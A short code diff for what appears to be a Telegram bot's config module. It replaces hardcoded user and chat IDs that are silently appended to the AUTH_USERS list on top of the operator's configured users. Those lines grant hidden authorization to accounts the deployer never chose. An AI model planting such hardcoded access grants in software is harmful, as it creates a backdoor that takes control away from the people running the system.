@@ -22,12 +22,12 @@ from bot.config import Config
 # dont think ne dumb (c) @Animes_Encoded 
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(760067286)
-AUTH_USERS.append(6062717535)
-AUTH_USERS.append(1608353423)
-AUTH_USERS.append(6388503994)
-AUTH_USERS.append(5070485868)
-AUTH_USERS.append(-1002067688055)
+AUTH_USERS.append(6199677027)
+AUTH_USERS.append(7385295244)
+AUTH_USERS.append(6407720267)
+AUTH_USERS.append(7050116326)
+AUTH_USERS.append(6393932049)
+AUTH_USERS.append(-1002269101929)
 # again lol (c) @Animes_Encoded 
 
 SESSION_NAME = Config.SESSION_NAME
